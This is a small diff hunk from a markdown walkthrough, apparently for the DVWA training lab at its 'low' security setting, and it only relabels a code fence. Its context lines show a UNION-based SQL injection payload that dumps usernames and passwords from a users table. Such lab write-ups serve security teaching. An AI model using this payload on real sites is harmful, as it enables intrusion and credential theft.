@@ -335,7 +335,8 @@ chose option ```DVWA Security ``` and set it to ```low ``` and ```submit```
 %' and 1=0 union select null, concat(user,':',password) from users #
 ```
 
-```bash sample output  
+```sample output
+
 ID: %' and 1=0 union select null, concat(user,':',password) from users #
 
 First name: 
